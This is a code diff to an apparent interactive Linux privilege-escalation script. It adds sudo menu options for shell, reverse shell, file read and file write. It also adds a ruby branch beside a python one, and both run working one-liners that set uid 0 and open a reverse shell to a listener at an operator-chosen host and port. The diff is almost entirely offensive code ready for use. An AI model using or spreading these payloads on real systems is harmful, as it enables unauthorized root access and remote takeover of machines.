@@ -134,17 +134,17 @@ while true; do
     echo " "
     echo "Sudo : "
     echo " "
-    echo "5) "
-    echo "6) "
-    echo "7) "
-    echo "8) "
+    echo "5) Shell (Sudo)"
+    echo "6) Reverse Shell (Sudo)"
+    echo "7) File Read (Sudo)"
+    echo "8) File Write (Sudo)"
     echo " "
     echo "SUID : "
     echo " "
     echo "9) Shell (SUID)"
     echo "10) Reverse Shell (SUID)"
-    echo "11) File Write (SUID)"
-    echo "12) File Read (SUID)"
+    echo "11) File Read (SUID)"
+    echo "12) File Write (SUID)"
     echo " "
     echo "13) Quit"
     echo " "    
@@ -214,9 +214,25 @@ while true; do
                         *python*)
                             
                             read -r -p "Set up your listener at $LHOST:$LPORT then press enter"
-                            echo "Trying with python3..."
+                            echo "Trying with $choice"
                             
                             "$choice" -c 'import sys,socket,os,pty;os.setuid(0);s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+                            read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
+
+                            if [[ "$answer" =~ ^[Yy]$ ]]; then
+                                break
+                            else
+                                break 2
+                            fi
+                            ;;
+
+                        *ruby*)
+                            
+                            read -r -p "Set up your listener at $LHOST:$LPORT then press enter"
+                            echo "Trying with $choice"
+                            
+                            "$choice" -rsocket -e 'Process::Sys.setuid(0); exit if fork;c=TCPSocket.new("'$LHOST'",'$LPORT');while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
                             read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
 
